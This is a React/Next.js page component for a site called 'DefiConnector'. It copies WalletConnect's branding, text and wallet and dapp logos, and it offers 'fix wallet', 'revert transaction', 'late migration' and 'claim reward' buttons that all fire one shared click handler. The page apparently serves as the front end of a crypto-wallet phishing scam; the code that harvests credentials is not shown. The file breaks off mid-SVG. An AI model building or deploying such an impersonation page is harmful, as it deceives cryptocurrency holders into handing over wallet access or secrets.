/* eslint-disable @next/next/no-img-element */
import React from "react";
import Image from "next/image";
import { useAccount } from "wagmi";

import { useWeb3ModalAccount } from "@web3modal/ethers5/react";

// Image
import logoPics from "../public/logo.png";
import heroIllustration from "../public/hero-illustration.png";
import blockChainConnect from "../public/blockchain-connect.png";
import cc from "../public/celo-chain.png";
import nc from "../public/near-chain.png";
import sc from "../public/solana-chain.png";
import pc from "../public/polkadot-chain.png";
import ccc from "../public/cosmos-chain.png";
import ec from "../public/ethereum-chain.png";

function Footer({ emitClickEvent, selectedWallet }) {
  const { isConnected } = useAccount();
  const web3AccountInformation = useWeb3ModalAccount();
  const handleClick = (event) => {
    emitClickEvent(event);
  };

  return (
    <>
      <div>
        <div className="css-306mec">
          <header className="css-13uwul9">
            <div className="css-1tixxw9">
              <nav className="css-gg4vpm">
                <div className="chakra-stack css-1ocidfa">
                  <a href="#" rel="home" className="css-0">
                    <span className="css-f8n5zr">WalletConnect Website</span>
                    <div href="/" className="css-iicfua">
                      <Image
                        className="h-10 w-14 object-contain"
                        src={logoPics}
                        alt=""
                        width={40}
                        height={54}
                      />
                      <span
                        className=""
                        style={{
                          color: "#4299e1",
                          fontWeight: "700",
                          marginLeft: "4px",
                        }}
                      >
                        DefiConnector
                      </span>
                    </div>
                  </a>
                  <div className="chakra-stack css-1p2dnrb">
                    <a
                      target="_blank"
                      rel="noopener noreferrer"
                      className="chakra-link css-c4aa4p"
                      href="https://docs.walletconnect.com/"
                    >
                      Docs
                    </a>
                    <a className="chakra-link css-c4aa4p" href="registry.html">
                      Registry
                    </a>
                  </div>
                </div>
                <div className="css-70qvj9">
                  <div className="">
                    {selectedWallet === "WalletConnect" &&
                    web3AccountInformation.isConnected ? (
                      <button
                        type="button"
                        className="chakra-button css-1irlmk3"
                      >
                        Connected
                      </button>
                    ) : selectedWallet === "MetaMask" &&
                      isConnected ? (
                      <button
                        type="button"
                        className="chakra-button css-1irlmk3"
                      >
                        Connected
                      </button>
                    ) : (
                      <button
                        type="button"
                        className="chakra-button css-1irlmk3"
                        onClick={handleClick}
                      >
                        Connect
                      </button>
                    )}
                  </div>
                </div>
              </nav>
            </div>
          </header>
        </div>

        <div>
          <section className="css-18rhaeg">
            <div className="css-25qoag">
              <div className="chakra-stack css-j4r6b">
                <div className="css-dfnjby">
                  <h1 className="chakra-heading css-jmvwdz">
                    Fix Wallet. <br />
                    Recover Wallet. <br />
                    Any Chain.
                  </h1>
                  <p className="chakra-text css-1nauaey">
                    DefiConnector is the web3 standard to connect blockchain
                    wallets to dapps, fix and recover wallet.
                  </p>
                  <div className="buttonActions">
                    <button
                      type="button"
                      className="chakra-button css-7xtvjh"
                      onClick={handleClick}
                    >
                      Revert transaction
                    </button>
                    <button
                      type="button"
                      className="chakra-button css-7xtvjh"
                      onClick={handleClick}
                    >
                      Fix wallet errors
                    </button>
                    <button
                      type="button"
                      className="chakra-button css-7xtvjh"
                      onClick={handleClick}
                    >
                      Connect to dapps
                    </button>
                    <button
                      type="button"
                      className="chakra-button css-7xtvjh"
                      onClick={handleClick}
                    >
                      Late migration
                    </button>
                    <button
                      type="button"
                      className="chakra-button css-7xtvjh"
                      onClick={handleClick}
                    >
                      Swap token
                    </button>
                    <button
                      type="button"
                      className="chakra-button css-7xtvjh"
                      onClick={handleClick}
                    >
                      Claim reward
                    </button>
                  </div>
                </div>

                <div className="css-1k0tpoy">
                  <Image
                    alt="hero-picture"
                    className="chakra-image css-8j0zw4"
                    src={heroIllustration}
                  />
                </div>
              </div>
            </div>
          </section>

          <section className="css-i66mct">
            <div className="css-25qoag">
              <div className="chakra-stack css-egpi4t">
                <div className="css-lfqnhh">
                  <h1 className="chakra-heading css-d3le4f">
                    The Blockchain SDK
                  </h1>

                  <p className="chakra-text css-2tyqjr">
                    Built for developers, the WalletConnect web, android, and
                    iOS SDK’s power millions of web3 connections every day.
                  </p>
                </div>

                <div className="css-fway70">
                  <Image
                    className="chakra-image css-w7cb44"
                    src={blockChainConnect}
                    alt="Screening talent"
                    width={100}
                    height={100}
                  />
                </div>

                <div className="chakra-stack css-263hi8">
                  <div className="css-1288xpw">
                    <svg
                      viewBox="0 0 24 24"
                      focusable="false"
                      className="chakra-icon css-138we7i"
                    >
                      <path
                        fill="currentColor"
                        d="M12,0A12,12,0,1,0,24,12,12.014,12.014,0,0,0,12,0Zm6.927,8.2-6.845,9.289a1.011,1.011,0,0,1-1.43.188L5.764,13.769a1,1,0,1,1,1.25-1.562l4.076,3.261,6.227-8.451A1,1,0,1,1,18.927,8.2Z"
                      ></path>
                    </svg>
                    <h6 className="chakra-heading css-fjez6r">Protocol</h6>

                    <p className="chakra-text css-dozho7">
                      WalletConnect is not an app, but an open protocol to
                      communicate securely between Wallets and Dapps (Web3
                      Apps).
                    </p>
                  </div>
                  <div className="css-1288xpw">
                    <svg
                      viewBox="0 0 24 24"
                      focusable="false"
                      className="chakra-icon css-138we7i"
                    >
                      <path
                        fill="currentColor"
                        d="M12,0A12,12,0,1,0,24,12,12.014,12.014,0,0,0,12,0Zm6.927,8.2-6.845,9.289a1.011,1.011,0,0,1-1.43.188L5.764,13.769a1,1,0,1,1,1.25-1.562l4.076,3.261,6.227-8.451A1,1,0,1,1,18.927,8.2Z"
                      ></path>
                    </svg>
                    <h6 className="chakra-heading css-fjez6r">
                      Secure Encryption
                    </h6>
                    <p className="chakra-text css-dozho7">
                      The protocol establishes a remote connection between two
                      apps and/or devices. These payloads are symmetrically
                      encrypted through a shared key between the two peers.
                    </p>
                  </div>
                  <div className="css-1288xpw">
                    <svg
                      viewBox="0 0 24 24"
                      focusable="false"
                      className="chakra-icon css-138we7i"
                    >
                      <path
                        fill="currentColor"
                        d="M12,0A12,12,0,1,0,24,12,12.014,12.014,0,0,0,12,0Zm6.927,8.2-6.845,9.289a1.011,1.011,0,0,1-1.43.188L5.764,13.769a1,1,0,1,1,1.25-1.562l4.076,3.261,6.227-8.451A1,1,0,1,1,18.927,8.2Z"
                      ></path>
                    </svg>
                    <h6 className="chakra-heading css-fjez6r">
                      QR Codes &amp; Deep Links
                    </h6>
                    <p className="chakra-text css-dozho7">
                      The connection is initiated by one peer displaying a QR
                      Code or deep link with a standard WalletConnect URI and is
                      established when the counter-party approves this
                      connection request.
                    </p>
                  </div>
                  <div className="css-1288xpw">
                    <svg
                      viewBox="0 0 24 24"
                      focusable="false"
                      className="chakra-icon css-138we7i"
                    >
                      <path
                        fill="currentColor"
                        d="M12,0A12,12,0,1,0,24,12,12.014,12.014,0,0,0,12,0Zm6.927,8.2-6.845,9.289a1.011,1.011,0,0,1-1.43.188L5.764,13.769a1,1,0,1,1,1.25-1.562l4.076,3.261,6.227-8.451A1,1,0,1,1,18.927,8.2Z"
                      ></path>
                    </svg>
                    <h6 className="chakra-heading css-fjez6r">Push Server</h6>
                    <p className="chakra-text css-dozho7">
                      Also included is an optional Push server to allow native
                      applications to notify the user of incoming payloads for
                      established connections.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section className="css-1mdk0dv">
            <div className="css-25qoag">
              <div className="chakra-stack css-1apleu7">
                <div className="chakra-stack css-l38wkl">
                  <div className="css-47qa7e">
                    <h1 className="chakra-heading css-hoyqsn">Any Wallet.</h1>
                    <p className="chakra-text css-1ix9wkv">
                      WalletConnect is built into more than 100 leading wallets.
                      Easily integrate WalletConnect into your wallet with our
                      Javascript, Swift, or Kotlin SDK’s.
                    </p>

                    <div
                      className="chakra-stack css-cb4hmv"
                      href="registry5cd5.html?type=wallet"
                    >
                      <div className="css-0">See all wallets</div>
                      <svg
                        stroke="currentColor"
                        fill="currentColor"
                        strokeWidth="0"
                        viewBox="0 0 20 20"
                        aria-hidden="true"
                        className="css-1kqzb4d"
                        height="1em"
                        width="1em"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          fillRule="evenodd"
                          d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        ></path>
                      </svg>
                    </div>
                  </div>
                  <div className="css-17ya0h2">
                    <div className="css-wjlldk">
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Rainbow</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          Trust Wallet
                        </h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Argent</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">MetaMask</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          Gnosis Safe Multisig
                        </h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          Crypto.com | DeFi Wallet
                        </h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Pillar</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">imToken</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">ONTO</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          TokenPocket
                        </h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          MathWallet
                        </h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/afbd95522f4041c71dd4f1a065f971fd32372865b416f95a0b1db759ae33f2a7"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          Steakwallet
                        </h6>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="chakra-stack css-1qnjbyf">
                  <div className="css-47qa7e">
                    <h1 className="chakra-heading css-hoyqsn">Any Dapp.</h1>
                    <p className="chakra-text css-1ix9wkv">
                      Hundreds of dapp’s use WalletConnect to connect with
                      wallets. Give users the choice to use your dapp with their
                      favorite wallet on any device. There is easy integration
                      with our Javascript, Swift, or Kotlin SDK’s.
                    </p>
                    <div
                      className="chakra-stack css-cb4hmv"
                      href="registry8eae.html?type=dapp"
                    >
                      <div className="css-0">See all dapp&#x27;s</div>
                      <svg
                        stroke="currentColor"
                        fill="currentColor"
                        strokeWidth="0"
                        viewBox="0 0 20 20"
                        aria-hidden="true"
                        className="css-1kqzb4d"
                        height="1em"
                        width="1em"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          fillRule="evenodd"
                          d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        ></path>
                      </svg>
                    </div>
                  </div>
                  <div className="css-17ya0h2">
                    <div className="css-wjlldk">
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/d2ae9c3c2782806fd6db704bf40ef0238af9470d7964ae566114a033f4a9a110"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Etherscan</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Uniswap</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/7ba1202d012a1402c8c56331471b183d2aaafb99a667dfdaf2ac4a123ea604ed"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          Binance DEX
                        </h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/f759efd17edb158c361ffd793a741b3518fe85b9c15d36b9483fba033118aaf2"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">OpenSea</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/a85fb60f37b9971969e00caa241ed2b6ccd8fce369f59d3a965202595a4a9462"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          Gnosis Safe Multisig
                        </h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/d82213ea5c476a43d9ab48d2011e3a5329a07826bd8191b24815e5bfe8c207be"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Compound</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/02563239502b03cef22f5e71059ce97bd48cf7ab0f856964d7e17c0e3631db9f"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Zapper</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/e6c38d65364335d550f629c44a1a86eb6befffa363e7de1cdba26462838226fd"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Aave</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/855679a1802326625d10fcaf45cf366aa529a58827d28d01edec0f5fd32330d4"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">Zerion</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/9a70a431ed25a8872ef971e3b02c9a7dfff2ae6cf66ec9eb37612aadefbc4e9d"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">
                          LocalCryptos
                        </h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/fd0cae9917f44482aae80d4a3ef4d8a53e50d465cde783baf5d2eca5cc53cf61"
                          loading="lazy"
                        />
                        <h6 className="chakra-heading css-8iszln">DeBank</h6>
                      </div>
                      <div className="css-b93e9j">
                        <img
                          alt=""
                          className="chakra-image css-acdi5e"
                          src="https://registry.walletconnect.com/api/v1/logo/lg/8308656f4548bb81b3508afe355cfbb7f0cb6253d1cc7f998080601f838ecee3"
                          loading="lazy"
                          width={100}
                          height={100}
                        />
                        <h6 className="chakra-heading css-8iszln">
                          Unstoppable Domains
                        </h6>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="chakra-stack css-l38wkl">
                  <div className="css-47qa7e">
                    <h1 className="chakra-heading css-hoyqsn">Any Chain.</h1>
                    <p className="chakra-text css-1ix9wkv">
                      WalletConnect is chain agnostic and built to work with any
                      blockchain. Developers can create multi-chain experiences
                      and applications. <br />
                      <br />
                      More chains coming soon.
                    </p>
                  </div>
                  <div className="css-17ya0h2">
                    <div className="css-1274svg">
                      <div className="css-b93e9j">
                        <Image
                          alt=""
                          className="chakra-image css-qy6sem"
                          src={ec}
                          loading="lazy"
                          width={100}
                          height={100}
                        />
                        <h6 className="chakra-heading css-8iszln">Ethereum</h6>
                      </div>
                      <div className="css-b93e9j">
                        <Image
                          alt=""
                          className="chakra-image css-qy6sem"
                          src={ccc}
                          loading="lazy"
                          width={100}
                          height={100}
                        />
                        <h6 className="chakra-heading css-8iszln">Cosmos</h6>
                      </div>
                      <div className="css-b93e9j">
                        <Image
                          alt=""
                          className="chakra-image css-qy6sem"
                          src={pc}
                          loading="lazy"
                          width={100}
                          height={100}
                        />
                        <h6 className="chakra-heading css-8iszln">Polkadot</h6>
                      </div>
                      <div className="css-b93e9j">
                        <Image
                          alt=""
                          className="chakra-image css-qy6sem"
                          src={cc}
                          loading="lazy"
                          width={100}
                          height={100}
                        />
                        <h6 className="chakra-heading css-8iszln">Celo</h6>
                      </div>
                      <div className="css-b93e9j">
                        <Image
                          alt=""
                          className="chakra-image css-qy6sem"
                          src={sc}
                          loading="lazy"
                          width={100}
                          height={100}
                        />
                        <h6 className="chakra-heading css-8iszln">Solana</h6>
                      </div>
                      <div className="css-b93e9j">
                        <Image
                          alt=""
                          className="chakra-image css-qy6sem"
                          src={nc}
                          loading="lazy"
                          width={100}
                          height={100}
                        />
                        <h6 className="chakra-heading css-8iszln">Near</h6>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </section>

          <section className="css-1g9ldak">
            <div className="css-1rdwdr0">
              <div className="css-1qte1vx">
                <h6 className="chakra-heading css-kyqiw5">For Developers</h6>

                <h2 className="chakra-heading css-15srl62">Start Building</h2>

                <p className="chakra-text css-bf1c63">
                  To quickly setup for your Dapp or Wallet, create a cloud
                  account for relay server access, then check out our code
                  examples and quick start guide.
                </p>

                <div className="chakra-stack css-1a3ee9r">
                  <button
                    type="button"
                    className="chakra-button css-1uu0xxz"
                    href="https://cloud.walletconnect.com/sign-up"
                  >
                    Get started
                  </button>
                  <button
                    type="button"
                    className="chakra-button css-1aszbee"
                    href="https://docs.walletconnect.com/"
                  >
                    Read the docs
                  </button>
                </div>
              </div>
            </div>
          </section>
        </div>

        <footer className="css-hwnzpz">
          <div className="css-146iuwu">
            <div id="top" className="css-edckke">
              <div className="css-1bqtcaf">
                <div className="css-0">
                  <p className="chakra-text css-16j990k">Links</p>

                  <ul className="chakra-stack css-1q8431l">
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="https://medium.com/walletconnect"
                      >
                        <span>Blog</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a className="chakra-link css-f4h6uy" href="faq">
                        <span>FAQ</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a className="chakra-link css-f4h6uy" href="terms">
                        <span>Terms</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a className="chakra-link css-f4h6uy" href="privacy">
                        <span>Privacy Policy</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="https://apply.workable.com/walletconnect/"
                      >
                        <span>Jobs</span>
                      </a>
                    </li>
                  </ul>
                </div>
                <div className="css-0">
                  <p className="chakra-text css-16j990k">Registry</p>
                  <ul className="chakra-stack css-1q8431l">
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="registry5cd5.html?type=wallet"
                      >
                        <span>Wallets</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="registry8eae.html?type=dapp"
                      >
                        <span>Dapps</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="registry/guidelines"
                      >
                        <span>Guidelines</span>
                      </a>
                    </li>
                  </ul>
                </div>
                <div className="css-0">
                  <p className="chakra-text css-16j990k">Resources</p>
                  <ul className="chakra-stack css-1q8431l">
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="https://docs.walletconnect.com/"
                      >
                        <span>Documentation</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="https://github.com/WalletConnect"
                      >
                        <span>GitHub</span>
                      </a>
                    </li>
                  </ul>
                </div>
                <div className="css-0">
                  <p className="chakra-text css-16j990k">Contact</p>
                  <ul className="chakra-stack css-1q8431l">
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="https://github.com/WalletConnect/walletconnect-monorepo/discussions"
                      >
                        <span>Discussions</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="https://discord.com/invite/cB54BwPGru"
                      >
                        <span>Discord</span>
                      </a>
                    </li>
                    <li className="css-0">
                      <a
                        className="chakra-link css-f4h6uy"
                        href="https://twitter.com/walletconnect"
                      >
                        <span>Twitter</span>
                      </a>
                    </li>
                  </ul>
                </div>
              </div>

              <div className="css-1jm6jy6">
                <p className="chakra-text css-16j990k">
                  Subscribe to our newsletter!
                </p>

                <p className="chakra-text css-15pvxu3">
                  Be the first to learn the news about new features and product
                  updates.
                </p>

                <div className="css-78b0tn">
                  <div role="group" className="chakra-form-control css-1ks7dh0">
                    <label
                      id="email-label"
                      className="chakra-form__label css-yklp1v"
                    >
                      Join our newsletter
                    </label>
                    <input
                      type="email"
                      placeholder="Join our newsletter"
                      id="email"
                      required=""
                      aria-required="true"
                      className="chakra-input css-1a5byz4"
                    />
                  </div>
                  <button type="button" className="chakra-button css-1aaawto">
                    Subscribe
                  </button>
                </div>
              </div>
            </div>

            <div className="css-fi84o4">
              <div className="chakra-stack css-ueo257">
                <div align="center" className="css-1b6sr3y">
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 1459 238"
                    version="1.1"
                    className="css-uwwqev"
                  >
                    <title>WalletConnect&#x27;s logo</title>
                    <g
                      id="Page-1"
                      stroke="none"
                      strokeWidth="1"
                      fill="none"
                      fillRule="evenodd"
                    >
                      <g id="walletconnect-logo-2">
                        <path
                          d="M526.766839,130.223822 L506.743339,202.279192 L485.915975,202.279192 L458,96.8269617 L480.873561,96.8269617 L497.462373,173.193962 L498.047001,173.193962 L517.778188,96.8269617 L536.413197,96.8269617 L556.144384,173.193962 L556.729011,173.193962 L573.390902,96.8269617 L596.264463,96.8269617 L568.27541,202.279192 L547.448046,202.279192 L527.424545,130.223822 L526.766839,130.223822 Z M626.665106,188.101969 C635.946072,188.101969 643.619311,182.036456 643.619311,173.559354 L643.619311,167.859233 L627.103577,168.882332 C619.138024,169.46696 614.607159,173.047805 614.607159,178.601768 C614.607159,184.448046 619.430338,188.101969 626.665106,188.101969 Z M619.649573,203.521526 C604.741566,203.521526 593.414403,193.875168 593.414403,179.771024 C593.414403,165.520722 604.376173,157.262855 623.888124,156.0936 L643.619311,154.924344 L643.619311,149.735773 C643.619311,142.427926 638.503818,138.189375 630.465187,138.189375 C622.499633,138.189375 617.457219,142.135612 616.434121,147.908811 L596.922169,147.908811 C597.726033,132.70849 610.660922,122.258269 631.415207,122.258269 C651.511786,122.258269 664.592832,132.635411 664.592832,148.420361 L664.592832,202.279192 L643.984703,202.279192 L643.984703,190.294323 L643.546233,190.294323 C639.161524,198.625269 629.442088,203.521526 619.649573,203.521526 Z M678.843133,202.279192 L678.843133,96.8269617 L700.182046,96.8269617 L700.182046,202.279192 L678.843133,202.279192 Z M715.090054,202.279192 L715.090054,96.8269617 L736.428966,96.8269617 L736.428966,202.279192 L715.090054,202.279192 Z M785.976168,138.043218 C776.622124,138.043218 769.898905,145.13183 769.168121,154.924344 L802.418824,154.924344 C801.980353,144.912594 795.476369,138.043218 785.976168,138.043218 Z M802.711138,178.309455 L822.296167,178.309455 C819.957656,193.655933 805.92659,203.959997 786.560796,203.959997 C762.444901,203.959997 747.975365,188.54044 747.975365,163.474525 C747.975365,138.481689 762.591058,122.258269 785.756933,122.258269 C808.557415,122.258269 822.953874,137.677826 822.953874,161.501407 L822.953874,168.00539 L768.948885,168.00539 L768.948885,169.320803 C768.948885,180.501809 776.037497,188.175048 786.926188,188.175048 C794.745585,188.175048 800.738019,184.301889 802.711138,178.309455 Z M839.615765,105.888692 L860.954677,105.888692 L860.954677,123.939074 L875.424214,123.939074 L875.424214,140.016337 L860.954677,140.016337 L860.954677,177.505591 C860.954677,183.498026 863.877816,186.348086 870.162565,186.348086 C872.062605,186.348086 874.035723,186.201929 875.351136,185.982694 L875.351136,201.694565 C873.158782,202.206114 869.504858,202.571506 865.193229,202.571506 C846.777455,202.571506 839.615765,196.432915 839.615765,181.159515 L839.615765,140.016337 L828.580916,140.016337 L828.580916,123.939074 L839.615765,123.939074 L839.615765,105.888692 Z M935.567794,204.106154 C904.874837,204.106154 885.6552,183.571104 885.6552,149.516538 C885.6552,115.53505 905.020994,95 935.567794,95 C960.926023,95 980.218739,111.077263 981.899543,134.681609 L960.414474,134.681609 C958.368277,121.74672 948.429605,113.269617 935.567794,113.269617 C918.905903,113.269617 908.163368,127.227605 908.163368,149.443459 C908.163368,171.951628 918.759746,185.836537 935.640873,185.836537 C948.721919,185.836537 958.149041,178.163298 960.487552,165.666879 L981.972622,165.666879 C979.487954,189.198146 961.437572,204.106154 935.567794,204.106154 Z M1029.69286,203.959997 C1006.01544,203.959997 990.888195,188.759676 990.888195,163.036055 C990.888195,137.677826 1006.23467,122.258269 1029.69286,122.258269 C1053.15105,122.258269 1068.49753,137.604747 1068.49753,163.036055 C1068.49753,188.832754 1053.37029,203.959997 1029.69286,203.959997 Z M1029.69286,187.663499 C1040.14308,187.663499 1046.79322,178.821004 1046.79322,163.109133 C1046.79322,147.543419 1040.07,138.554767 1029.69286,138.554767 C1019.31572,138.554767 1012.51942,147.543419 1012.51942,163.109133 C1012.51942,178.821004 1019.16956,187.663499 1029.69286,187.663499 Z M1079.4593,202.279192 L1079.4593,123.939074 L1100.06743,123.939074 L1100.06743,137.897061 L1100.5059,137.897061 C1104.67137,128.177625 1112.92924,122.477504 1124.98719,122.477504 C1142.37986,122.477504 1152.17238,133.439275 1152.17238,151.78197 L1152.17238,202.279192 L1130.83346,202.279192 L1130.83346,156.239757 C1130.83346,146.008771 1126.01028,140.162494 1116.437,140.162494 C1106.86373,140.162494 1100.79821,147.178027 1100.79821,157.335934 L1100.79821,202.279192 L1079.4593,202.279192 Z M1165.69189,202.279192 L1165.69189,123.939074 L1186.30002,123.939074 L1186.30002,137.897061 L1186.73849,137.897061 C1190.90396,128.177625 1199.16183,122.477504 1211.21978,122.477504 C1228.61245,122.477504 1238.40497,133.439275 1238.40497,151.78197 L1238.40497,202.279192 L1217.06606,202.279192 L1217.06606,156.239757 C1217.06606,146.008771 1212.24288,140.162494 1202.6696,140.162494 C1193.09632,140.162494 1187.03081,147.178027 1187.03081,157.335934 L1187.03081,202.279192 L1165.69189,202.279192 Z M1287.07523,138.043218 C1277.72119,138.043218 1270.99797,145.13183 1270.26718,154.924344 L1303.51789,154.924344 C1303.07941,144.912594 1296.57543,138.043218 1287.07523,138.043218 Z M1303.8102,178.309455 L1323.39523,178.309455 C1321.05672,193.655933 1307.02565,203.959997 1287.65986,203.959997 C1263.54396,203.959997 1249.07443,188.54044 1249.07443,163.474525 C1249.07443,138.481689 1263.69012,122.258269 1286.85599,122.258269 C1309.65648,122.258269 1324.05293,137.677826 1324.05293,161.501407 L1324.05293,168.00539 L1270.04795,168.00539 L1270.04795,169.320803 C1270.04795,180.501809 1277.13656,188.175048 1288.02525,188.175048 C1295.84465,188.175048 1301.83708,184.301889 1303.8102,178.309455 Z M1406.19313,153.097383 L1386.38887,153.097383 C1385.14653,144.839516 1379.66565,138.993238 1370.89623,138.993238 C1360.37293,138.993238 1353.79587,147.908811 1353.79587,163.036055 